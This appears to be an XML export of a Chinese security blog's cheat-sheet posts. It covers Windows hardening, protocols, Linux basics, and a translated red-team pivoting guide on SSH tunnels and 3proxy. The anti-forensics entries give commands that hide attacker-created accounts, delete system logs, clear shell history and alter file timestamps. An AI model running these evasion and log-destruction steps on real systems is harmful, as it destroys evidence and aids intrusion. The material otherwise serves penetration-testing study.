    <content type="text"><![CDATA[基本配置下面这几项应为每一个使用Windows的用户的最最基本安全配置： 开启Windows防火墙 设置用户帐户控制(UAC)为合适级别 保持Windows更新 帐户安全此方面的加固主要是为了防止针对帐户的暴力破解，帐户是黑客入侵系统的突破口，帐户越多，危险系数越高。 停用Guest帐户：在计算机管理的本地用户和组中禁用Guest帐户，并为Guest帐户设置复杂密码，并拒绝远程访问。 重命名或禁用Administrator帐户：在计算机管理的本地用户和组中为Administrator帐户重命名，或直接禁用。 创建陷阱帐户：在计算机管理的本地用户和组中创建一个名为Administrator的本地帐户，并将它的权限设置成最低，加上一个超过10位的强密码。可通过将其隶属于Guest组已达到权限最低。 限制用户数量：在计算机管理的本地用户和组中删除所有的测试帐户、共享帐户和普通部门帐户，一般情况下，如果系统用户超过10个，一般总会存在一两个弱口令帐户。 开启帐户锁定策略：在本地安全策略的帐户锁定策略中设置帐户锁定阈值为3次，帐户锁定时间为30分钟，重置帐户锁定计数器为30分钟之后。 系统安全一个安全操作系统的基本原则是：最小的权限+最少的服务=最大的安全。 开启密码策略：在本地安全策略的密码策略中启用密码复杂性要求，设置密码长度最小值为7，密码最短使用期限为1，密码最长使用期限为42，强制密码历史为24，禁用以可还原的加密储存密码。 设置双重加密帐户保护：在运行对话框中输入syskey，启用SAM数据库加密工具，为Windows登录设置双重加密，注意此功能在Windows10中已被剔除。 取消默认共享：编辑注册表键HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters，新建项AutoShareServer，值为0，即可关闭盘符默认共享，新建项AutoShareWks，值为0，即可关闭ADMIN默认共享。 开启审核策略：在本地安全策略的审核策略中审核所有的成功失败操作，记录的信息可以在事件查看器的Windows日志中查看。 修改TTL值：编辑注册表键HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Tcpip\Parameters，新建项defaultTTL，随便赋值，以防黑客通过ping获取TTL以鉴别操作系统类型。 关闭不必要的服务：Windows默认会启动多个服务，可以在计算机管理的服务中禁用相关服务，下面列出了一些可以禁用的服务： COM+ Event System Computer Browser Distributed Link Tracking Client Routing and Remote Access]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[802.11协议分析]]></title>
    <url>%2F2018%2F05%2F11%2F80211%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPSec运行机制]]></title>
    <url>%2F2018%2F05%2F11%2Fipsec%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IP协议分析]]></title>
    <url>%2F2018%2F05%2F11%2Fip%2F</url>
    <content type="text"><![CDATA[IP(Internet Protocol，网际协议) 数据报格式]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCP协议分析]]></title>
    <url>%2F2018%2F05%2F11%2Ftcp%2F</url>
    <content type="text"><![CDATA[TCP(Transmission Control Protocol，传输控制协议) 报文段结构]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTPS运行机制]]></title>
    <url>%2F2018%2F05%2F11%2Fhttps%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP协议分析]]></title>
    <url>%2F2018%2F05%2F11%2FHTTP%2F</url>
    <content type="text"><![CDATA[HTTP(Hypertext Transfer Protocol，超文本传输协议) 报文格式HTTP请求报文方法字段可以取几种不同的值，包括GET、POST、HEAD、PUT和DELETE。绝大部分的HTTP请求报文使用GET方法。Host首部行指明对象所在的主机，该信息是Web代理高速缓存所要求的；Connection首部行指明采用非持续连接还是持续连接；User-Agent首部行指明用户代理；Accept-Language首部行指明用户想得到的语言版本。使用GET方法时实体体(entity body)为空，而使用POST方法时才使用该实体体。HEAD方法类似于GET方法。当服务器收到使用HEAD方法的请求时，将会用一个HTTP报文进行响应，但是并不返回请求对象。应用程序开发者常用HEAD方法进行调试跟踪。PUT方法常与Web发行工具联合使用，它运行用户上传对象到指定的Web服务器上指定的路径(目录)。PUT方法也被那些需要向Web服务器上传对象的应用程序使用。DELETE方法允许用户或者应用程序删除Web服务器上的对象。 HTTP响应报文Date首部行指示服务器产生并发送该响应报文的日期和时间；Last-Modified首部行指示了对象创建或者最后修改的日期和时间；Server首部行指示服务器类型，类似于User-Agent首部行；Content-Length首部行指示了被发送对象中的字节数；Content-Type首部行指示了实体体中的对象的MIME类型。常见的状态码和其对应的短语：200 OK：请求成功，信息在返回的响应报文中。301 Moved Permanently：请求的对象已经被永久转移了，新的URL定义在响应报文的Location首部行中。客户软件将自动获取新的URL。400 Bad Request：一个通用差错代码，指示该请求不能被服务器理解。404 Not Found：被请求的文档不在服务器上。505 HTTP Version Not Supported：服务器不支持请求报文使用的HTTP协议版本。 Web缓存条件GET(conditional GET)方法：请求报文使用GET方法，并且请求报文中包含一个If-Modified-Since首部行。Web缓存器为了验证所缓存的对象是否是最新的，会使用条件GET方法向目标服务器发送一个请求报文，If-Modified-Since首部行的值为当初缓存对象时响应报文中Last-Modified首部行的值。如果所要验证的对象是最新的，即没有被修改过，则目标服务器会返回一个“304 Not Modified”响应报文，其中实体体为空。 注意 HTTP是一个无状态协议(stateless protocol)。 HTTP可以采用非持续连接或持续连接，默认采用持续连接。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[set、env与export]]></title>
    <url>%2F2018%2F05%2F09%2Fset-env-export%2F</url>
    <content type="text"><![CDATA[环境变量环境变量，顾名思义由环境和变量两部分组成，本质上就是一些变量，每个进程都有一个自己的运行环境，而在这些环境中又有一些定义的变量，Shell也是如此，同样的，通过Shell所运行的命令，相当于从父进程创建了一个子进程，它们共享同样的环境变量。环境变量可以大致分为Shell环境变量和用户环境变量两大类，不同的Shell有不同的Shell环境变量，例如bash与zsh的Shell环境变量就不相同，而用户环境变量通常是由用户自定义的，Shell环境变量包含了用户环境变量。在Shell中可以使用declare命令直接定义Shell环境变量，如：1declare A=hello #定义Shell环境变量a，值为hello，注意等号两边不能有空格 使用echo命令即可打印环境变量的值，如：1echo $A #打印HOME的值 值得注意的是，这种定义只对本Shell有效，关闭Shell后失效。 常见的用户环境变量有： PATH：用以指定命令的搜索目录 HOME：用以指定用户的家目录 SHELL：用以指定用户的登录Shell setset命令用来显示或设置Shell环境变量，当不带参数运行时默认显示所有已定义的Shell环境变量，若要设置环境变量可采用：12 值得注意的是，当declare命令不带任何参数运行时，也会显示所有的Shell环境变量，但它比set显示的结果要更加清晰。关于set命令更多的参数使用说明可参考Bash脚本set命令教程 envenv命令用来显示或设置用户环境变量，当不带参数运行时默认显示所有已定义的用户环境变量，若要设置环境变量可采用：12 exportexport命令用来显示或设置当前导出至用户环境变量的Shell环境变量，当不带参数运行时默认显示所有已导出至用户环境变量的Shell环境变量，若要导出某Shell环境变量到用户环境变量可采用：1export a=hello 这一步操作实际上完成了两步操作，即：12declare a=hello #定义一个Shell环境变量$aexport $a #导出至用户环境变量]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[source、sh与 ./]]></title>
    <url>%2F2018%2F05%2F09%2Fsource-sh%2F</url>
    <content type="text"><![CDATA[sourcesource a.sh在当前Shell中执行a.sh，a.sh不需要有执行权限。source也可以简写为.，比如. a.sh。 shsh a.sh打开一个子Shell去执行a.sh，a.sh不需要有执行权限。在子Shell里执行的a.sh里设置的变量，不会影响到父Shell。类似的，bash与sh同理。 ././a.sh打开一个子Shell去执行a.sh，a.sh需要有执行权限。注意，这里./与a.sh之间没有空格，换个角度看，其实没有使用任何命令，只是指定了当前文件夹下的这个文件而已。这就相当于双击这个文件去运行一样，那这个文件肯定要具有可执行权限。至于为什么要加./，我猜想是为了预防与环境变量中相同的名称引起冲突。前面采用了相对路径的方法，当然也可以采用绝对路径，比如/root/a.sh这样，同样可以执行。另外，./运行的文件里通常有Shebang一行，也就是以#!开头的第一行，用以指明执行这个脚本文件的解释程序。如果没有Shebang一行，那么以./a.sh运行脚本时，会自动使用环境变量中的$SHELL变量所指定的解释器来运行。最后，在以sh a.sh或bash a.sh这样的命令运行脚本时，即使文件中指明了Shebang，也会自动忽略，因为在命令中已经明确指定了所采用的解释器。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux的包管理机制]]></title>
    <url>%2F2018%2F05%2F09%2Flinux-package%2F</url>
    <content type="text"><![CDATA[Linux大致可以分为2个派别：一派以Red Hat为首，主要包括CentOS(社区版)、Fedora(桌面版)等；另一派以Debian为首，主要包括Ubuntu、Kali等。Red Hat系采用rpm为其包格式，yum为其包管理工具；Debian系采用dpkg为其包格式，apt-get为其包管理工具。 rpm与yumrpm全称Red-Hat Package Manager(RPM软件包管理器)，是Red Hat系中的包格式，同时也是其本地包管理工具，常用命令有：12rpm -i a.rpm #安装arpm -e a #卸载a yum全称Yellow dog Updater, Modified(修改后的黄色狗更新器)，是Red Hat系中的包管理工具，常用命令有：1234yum update #更新包列表yum upgrade #更新包yum install a #安装ayum remove a #卸载a dpkg与apt-getdpkg全称Debian Packager(Debian包工具)，是Debian系中的包格式，同时也是其本地包管理工具，常用命令有：12dpkg -i a.dpkg #安装adpkg -r a #卸载a apt-get是apt中的一个子程序，apt全称Advanced Packaging Tool(先进的包工具)，是Debian系中的包管理工具，常用命令有：1234apt-get update #更新包列表apt-get upgrade #更新包apt-get install a #安装aapt-get remove a #卸载a 值得注意的是，随着新版系统的到来，出现了更为强大的apt命令，可以简单认为apt集合了apt-get、apt-cache、apt-config中的最常用命令选项。例如，apt install相比apt-get install增加了色彩显示以及进度条显示等功能。因此，更建议使用apt命令，常用命令有：1234apt update #更新包列表apt upgrade #更新包apt install a #安装aapt remove a #卸载a]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手机号与身份证号的秘密]]></title>
    <url>%2F2018%2F05%2F09%2Fphone-number-and-id-card%2F</url>
    <content type="text"><![CDATA[手机号码国内手机号码为11位数，按照各部分编码的含义可以分为3段：前3位是网络识别号，用以标识一个通信运营商；第4-7位是地区编码，由HLR归属位置寄存器确定；第8-11位是用户号码，此段随机分配。 身份证号码国内居民身份证号码为18位数，按照各部分编码的含义可以分为4段：前6位是地址码，即编码对象常住户口所在县的行政区划代码，其中第1-2位表示省，第3-4位表示市，第5-6位表示县；第7-14位是出生日期码；第15-17位是顺序码，即在地址码所标识的区域范围内，对同年、月、日出生的人员编定的顺序号，其中第17位奇数分给男性，偶数分给女性；第18位是校验码，根据前面17位数字码，按照如下算法计算出来的：]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MIME Type]]></title>
    <url>%2F2018%2F05%2F09%2FMIME-Type%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[后渗透测试阶段的信息收集]]></title>
    <url>%2F2018%2F05%2F09%2Finformation-gathering-of-post-exploitation%2F</url>
    <content type="text"><![CDATA[浏览器密码、历史，电脑密码，邮箱密码，QQ聊天记录，最近打开的文件，环境变量，持久后门我们假设客户端为Windows系统，服务器为Linux系统，下面分别针对客户端与服务器进行信息收集。 Windows登录密码Windows的登录密码保存在%windir%\System32\config\SAM中， Linux]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[针对哈希算法的攻击]]></title>
    <url>%2F2018%2F05%2F09%2Fhash-attack%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编码与加密]]></title>
    <url>%2F2018%2F05%2F08%2Fencode-encrypt%2F</url>
    <content type="text"><![CDATA[编码编码(encode)是信息从一种形式或格式转换为另一种形式的过程。相应的，解码(decode)是编码的逆过程。常见的编码算法有ASCII编码、URL编码、HTML编码、Base64编码等。 加密加密(encryption)是将明文信息改变为难以读取的密文内容，使之不可读。只有拥有解密方法的对象，经由解密(decryption)过程，才能将密文还原为正常可读的内容。现代密码学中的加密算法可以分为两类：对称加密(Symmetric encryption)和非对称加密(Asymmetric encryption)。对称加密就是将信息使用一个密钥进行加密，解密时使用同样的密钥，同样的算法进行解密。非对称加密，又称公开密钥加密，是加密和解密使用不同密钥的算法，一个是公开密钥，一个是私有密钥，一个用作加密的时候，另一个则用作解密，虽然两个密钥在数学上相关，但如果知道了其中一个，并不能凭此计算出另外一个。在通信中，加密通常使用的是对方的公钥，当对方收到密文后可以使用自己的私钥解密。如果加密使用的是自己的私钥，则密文可由任何人解密，由此可验证该文件必定出自该用户，这亦称作数字签名(Digital Signature)。常见的对称加密算法有DES、3DES、AES、RC5等。常见的非对称加密算法有RSA、Elgamal等。非对称加密在计算上相当复杂，速度远远比不上对称加密，因此，在一般实际情况下，往往通过非对称加密来随机创建临时的对称密钥，亦即对话键，然后才通过对称加密来传输大量、主体的数据。加密算法实质上是密码算法中的一种，另一种则是哈希(hash)算法。 哈希哈希算法，又称为散列算法，就是把任意长度的输入变换成固定长度的输出，是一种不可逆的算法，也就是说不能通过密文(即哈希值)反算出明文，这是一种单向加密的算法。另外，多个不同的明文可能会得到同一个密文，因为值域是有限的，这种情况称为冲突。一个优秀的哈希算法会尽量的减少这种冲突性。常见的哈希算法有MD5、SHA-1、SHA-256、CRC-32、CRC-64等。注意： 密码学建议，不要使用任何自己创造的私有加密算法，应该使用广泛使用的公开加密算法，这些都是已被证明安全的。 编码与加密主要的区别在于，所用的Key是否是公共所知的，或者说，编码根本就没有Key。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反取证之Windows]]></title>
    <url>%2F2018%2F05%2F02%2Fanti-forensics-windows%2F</url>
    <content type="text"><![CDATA[MACE时间和反取证之Linux中的一样，Windows也有MAC时间，不过在Windows中，C指的是Created，即创建时间，Windows中默认显示的是修改时间，另外，在Windows的NTFS文件系统中还有E时间，即MFT entry，其中包含了文件的大量信息，包括大小、名称、目录位置、磁盘位置、创建日期等，在擦除痕迹时也要擦除E时间，同样，meterpreter中的timestomp命令可以方便的修改MACE时间。 隐藏新建账号当在目标系统上新建了用户账号后，通常会在登录界面上显示出来，要实现隐藏，可以修改注册表项，采用如下命令：1REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v uname /t REG_DWORD /d 0 注意：这种隐藏只是在登录界面的隐藏，用户使用net user或“本地用户和组”仍然可以查到新建的账户。 日志文件清除相关日志文件 系统日志Windows系统日志文件一般存放在Windows文件夹下，可以使用如下命令删除之：1del %windir%\*.log /a/s/q/f 另外，meterpreter中的clearev命令可以删除事件查看器中的日志信息。 Web日志IIS的日志文件位于%windir%\System32\LogFiles目录下。 最后，请不要忘记HIDS/IPS/WAF/集中的日志服务器的痕迹擦除。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>计算机取证</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反取证之Linux]]></title>
    <url>%2F2018%2F05%2F02%2Fanti-forensics-linux%2F</url>
    <content type="text"><![CDATA[后渗透测试阶段的重要工作便是擦除痕迹，也即反取证，文件系统访问都会留下痕迹，最好的避免计算机取证的方法就是不要碰文件系统，这也是meterpreter的先天优势，它完全基于内存，Linux中的反取证主要涉及MAC时间、日志文件、history： MAC时间MAC即Modified/Accessed/Changed，也就是修改/访问/更改时间，修改时间指对文件内容修改时的时间，访问时间指对文件内容访问时的时间(例如通过cat查看时)，更改时间指对文件属性、权限更改时的时间。使用ls -l默认查看的是修改时间，要查看其余2个时间，可以加参数ls -l --time=atime/ctime，另一个查看MAC时间的命令是stat。使用touch -d &quot;5 days ago&quot;或touch -t 1805021030可以修改MAC中的MA时间。meterpreter中的timestomp命令可以方便的修改MAC时间。 日志文件清除相关日志文件 系统日志Linux中的日志文件主要有/var/log/auth.log、/var/log/secure、/var/log/wtmp、/var/log/btmp、/var/log/lastlog、/var/log/faillog。Debian系的auth.log文件与RedHat系的secure文件都记录了系统的登录日志，last命令用于查看登录日志以及重启日志，文件位于/var/log/wtmp；lastb命令用于查看登录失败日志，文件位于/var/log/btmp；lastlog命令用于查看所有用户最近一次登录日志，文件位于/var/log/lastlog；faillog命令与lastlog命令一样，用于查看用户登录失败日志，文件位于/var/log/faillog，此命令仅限于Debian系。 Web日志Apache的日志文件位于/var/log/apache2；Nginx的日志文件位于/var/log/nginx。 historyLinux中，每次输入的命令都会记录在用户文件夹中的.bash_history文件中，默认记录1000条命令，使用history命令即可查看，清除记录的方法是使用history -c命令。另一种清除记录的方法是更改.bash_history文件的属性，使用命令：chattr +i .bash_history使其不可被更改，从而无法向其写入任何数据。 最后，请不要忘记HIDS/IPS/WAF/集中的日志服务器的痕迹擦除。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>计算机取证</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[形而上与形而下]]></title>
    <url>%2F2018%2F05%2F01%2Fmetaphysics-physics%2F</url>
    <content type="text"><![CDATA[形而上者谓之道，形而下者谓之器。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Sniper、Battering ram、Pitchfork、Cluster bomb的区别]]></title>
    <url>%2F2018%2F05%2F01%2Fburpsuite-intruder-attack-type%2F</url>
    <content type="text"><![CDATA[Burp Suite中的Intruder模块里有4种攻击模式，分别为Sniper、Battering ram、Pitchfork、Cluster bomb，在这里假设Payload set1=[1, 2]，Payload set2=[a, b, c, d]： SniperSniper，中文“狙击手”，每次只针对1个Payload Position，使用1个Payload set，示例如下： Request Position1(default:x) Position2(default:y) #1 1 y #2 2 y #3 x 1 #4 x 2 Battering ramBattering ram，中文“攻城槌”，每次针对多个Payload Position，使用1个Payload set，示例如下： Request Position1 Position2 #1 1 1 #2 2 2 PitchforkPitchfork，中文“杈子”，每次针对多个Payload Position，使用多个Payload set，最多支持5个列表，也即5个位置，采用平行模式，请求次数以最小列表项为准，示例如下： Request Position1 Position2 #1 1 a #2 2 b Cluster bombCluster bomb，中文“集束炸弹”，每次针对多个Payload Position，使用多个Payload set，最多支持5个列表，也即5个位置，采用交叉模式，请求次数为各列表项之积，示例如下： Request Position1 Position2 #1 1 a #2 1 b #3 1 c #4 1 d #5 2 a #6 2 b #7 2 c #8 2 d]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[URI与URL的区别]]></title>
    <url>%2F2018%2F04%2F29%2Furl-uri%2F</url>
    <content type="text"><![CDATA[URI，全称”Uniform Resource Identifier”，中文“统一资源标志符”，是一个用于标识某一互联网资源名称的字符串。URI的最常见的形式是统一资源定位符（URL），经常指定为非正式的网址。更罕见的用法是统一资源名称（URN），其目的是通过提供一种途径，用于在特定的名字空间资源的标识，以补充网址。 URL，全称”Uniform Resource Locator”，中文“统一资源定位符”，URL是URI的子集。示例如下：https://howiezhao.github.io/2018/04/29/url-uri/上面这个URL唯一标识了互联网中一台服务器上的一篇文章。 URN，全称”Uniform Resource Name”，中文“统一资源名称”，是另一种形式的URI，它通过特定命名空间中的唯一名称来标识资源。示例如下：urn:isbn:9780141036144上面这个URN唯一标识了乔治·奥威尔所著的《1984》。 简单说，URL代表一个人的位置，URN代表一个人的身份证号，通过URL和URN都可以唯一的找到这个人，所以它们都属于URI。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透中PoC、Exp、Payload与Shellcode的区别]]></title>
    <url>%2F2018%2F04%2F29%2Fpayload-shellcode-exp-poc%2F</url>
    <content type="text"><![CDATA[PoC，全称”Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。Exp，全称”Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。Payload，中文“有效载荷”，指成功exploit之后，真正在目标系统执行的代码或指令。Shellcode，简单翻译“shell代码”，是Payload的一种，由于其建立正向/反向shell而得名。 几点注意：PoC是用来证明漏洞存在的，Exp是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了PoC，才有Exp。Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的Exp，也就是说不存在通用的Exp。Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。Shellcode与Shellshcok不是一个，Shellshock特指14年发现的Shellshock漏洞。 另外：在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用Stager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。 尾巴：想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个PoC，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了它家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个Exp，你在他家所做的就是不同的Payload，就把窃听器当作Shellcode吧！]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux中/etc/passwd与/etc/shadow的区别]]></title>
    <url>%2F2018%2F04%2F29%2Fpasswd-and-shadow%2F</url>
    <content type="text"><![CDATA[简单来说，/etc/passwd存储一般的用户信息，任何人都可以访问；/etc/shadow存储用户的密码信息，只有 root 用户可以访问。下面来详细介绍： /etc/passwd早期的Linux中，用户的密码也存储在此文件中，但因为此文件所有人都可以访问，对密码的存储不安全，但又不能把它的权限改为仅 root 用户，因为系统的其他程序可能会用到此文件中存储的用户其他信息，所以，后来Linux将用户密码存储到了/etc/shadow文件中，并将其权限设为仅 root 用户。在渗透过程中，这两个文件最好都检查。/etc/passwd的文件格式为：用户名:密码:用户ID:用户组ID:注释:用户目录:登录shell，共7项，默认情况下，root的用户ID为0，新建的其他用户ID从1000起，如果密码被存储在了/etc/shadow文件中，则此文件中密码项为x，常见形式如下：1root:x:0:0:root:/root:/bin/bash /etc/shadow/etc/shadow的文件格式为：用户名:密码:上次修改密码日期(从1970年1月1日起的天数):密码在两次修改期间的最小天数(0表示可在任何时间修改):密码需要被变更的天数(99999表示不需要变更):密码变更前提前几天警告:账号失效日期:账号失效后被禁用的天数:保留字段，共9项，如果密码项以 ! 或 * 起始，则代表此账号被锁定，不能用于登录，密码项中更为详细的格式为：\$加密方法ID\$Salt\$加密值，常见形式如下：1root:$6$Fsf6Q6SH$MlagWih0lcGFxtAo7/s8Z5.wywJyCqH6qateZ6yPFOPm8bNYTGAEPygZxSOPR1A9Rtw.WxJp2fNMOoeB1wj890:17524:0:99999:7:::]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Rolling 2017中无法登录BeEF的解决方案]]></title>
    <url>%2F2018%2F02%2F08%2Fkali-beef-bug%2F</url>
    <content type="text"><![CDATA[在Kali Rolling 2017中打开BeEF然后自动跳转到登录页面，会发现只有BeEF的图标而没有登录框，无法进行登录，经查是因为和Metasploit的集成有关的，解决方案如下：将/usr/share/beef-xss/extensions/admin_ui/api/handler.rb文件中第22行的1minified = Uglifier.compile(evaluated) 改为1minified = evaluated 保存并重启BeEF即可。]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Udacity CS373:无人驾驶汽车编程学习笔记一]]></title>
    <url>%2F2017%2F12%2F14%2Fcs373-1%2F</url>
    <content type="text"><![CDATA[一：定位蒙特卡罗定位是感知和运动的循环，每次感知都会获得信息，每次运动都会丢失信息，感知函数利用了贝叶斯规则，运动函数利用了全概率定理。基于一维的蒙特卡罗定位程序如下：1234567891011121314151617181920212223242526272829303132p = [0, 1, 0, 0, 0)world = ['green', 'red', 'red', 'green', 'green']measurements = ['red', 'green']motions = [1, 1]pHit = 0.6pMiss = 0.2pExact = 0.8pOvershoot = 0.1pUndershoot = 0.1def sense(p, Z): q = [] for i in range(len(p)): hit = (Z == world[i]) q.append(p[i] * (hit * pHit + (1-hit) * pMiss)) s = sum(q) for i in range (len(p)): q[i] = q[i]/s return qdef move(p, U): q= [] for i in range(len(p)): s = pExact * p[(i-U) % len(p)] s = s + pOvershoot * p[(i-U-1) % len(p)] s = s + pUndershoot * p[(i-U+1) % len(p)] q.append(s) return qfor k in range(len(measurements)): p = sense(p, measurements[k]) p = move(p, motions[k]) print p]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>CS373</tag>
        <tag>无人驾驶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个Red Team成员的跳板(pivoting)指南]]></title>
    <url>%2F2017%2F12%2F10%2Fpivoting-guide%2F</url>
    <content type="text"><![CDATA[本文翻译自https://artkond.com/2017/03/23/pivoting-guide/ ，正文如下： 渗透测试人员经常通过逻辑网络边界来访问客户的关键基础设施。常见的情况包括在成功的外围攻破之后，将攻击发展到内部网络，或者在危及组织内的主机之后访问初始的不可路由的网段。跳板是red team/pentest参与过程中使用的一系列技术，它们利用攻击者控制的主机作为逻辑网络进行跳跃，旨在扩大网络可视性。在这篇文章中，我将介绍常用的跳板技术和可用的工具。 以公有IP为目标一个普遍的情况。比方说，你可以从互联网上找到一个网络应用程序中的RCE漏洞。你上传了一个shell，并想把你的攻击发展到内部网络。请注意，在这种特定情况下，你应该能够绑定受感染主机上的端口，并且应该可以从外部网络访问这些端口。 SSH端口转发设法找到在主机上运行的SSH服务的凭据？很好！连接到主机，如下所示：1ssh username@host -D 1080 这将在攻击者一侧产生一个socks服务器（ssh客户端）。欢迎来到内部网络;）也可以将一个特定的端口转发给特定的主机。假设你需要访问主机192.168.1.1的内部网络中的SMB共享。1ssh username@host -L 445:192.168.1.1:445 这样，端口445就会被打开在攻击者一侧。请注意，要绑定特权端口（例如445），你将需要在你的计算机上拥有root权限。 通过SSH的VPN由于openssh 4.3版本，可以通过已建立的ssh通道来传输第3层网络流量。这比典型的tcp隧道有优势，因为你在控制ip流量。因此，例如，你可以使用nmap执行SYN扫描，并直接使用你的工具，而无需使用proxychains或其他代理工具。它是通过在客户端和服务器端创建tun设备并通过ssh连接在它们之间传输数据完成的。这很简单，但是由于tun设备的创建是一个特权操作，所以在两台机器上都需要root。这些行应该出现在/etc/ssh/sshd_config文件（服务器端）中：12PermitRootLogin yesPermitTunnel yes 客户端上的以下命令将在客户端和服务器上创建一对tun设备：1ssh username@server -w any:any 标志-w接受用冒号分隔的每一侧的tun设备的数量。可以显式设置 —— -w 0:0，也可以使用-w any:any语法来获取下一个可用的tun设备。tun设备之间的隧道已启用，但接口尚未配置。配置客户端的示例：1ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 服务器端：1ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 在服务器上启用IP转发和NAT：12echo 1 &gt; /proc/sys/net/ipv4/ip_forwardiptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE 现在，你可以将对等主机1.1.1.1设置为你的默认网关，或通过它路由到特定的主机/网络：1route add -net 10.0.0.0/16 gw 1.1.1.1 在这个例子中，服务器的外部网络接口是eth0，两端新创建的tun设备是tun0。 3proxy在这里获取 - https://github.com/z3APA3A/3proxy/releases 。这个工具适用于多个平台。有预编译的Windows二进制文件。至于Linux，你将需要自己编译它，这是一个很简单的事，只是./configure &amp;&amp; make :)这个工具是代理世界中的瑞士军刀，所以它有很多的功能。我通常使用它作为socks代理或端口转发。这个工具从配置文件中获得所有选项。运行它：13proxy.exe config_file 或者如果你在Linux系统上：1./3proxy config_file 要在端口1080上运行3proxy作为socks5代理，请在config中放置以下行：1socks -p1080 现在可以通过这个代理来隧道化你的渗透测试工具，以发展内部网络的攻击。这只是一个不太安全的基本设置。你可以使用选项来放置身份验证和/或基于IP的访问控制规则。去检查完整的手册在这里 - https://3proxy.ru/howtoe.asp 。要对特定端口进行隧道使用，请用以下语法：1tcppm &lt;localport&gt; &lt;targethost&gt; &lt;targetport&gt; 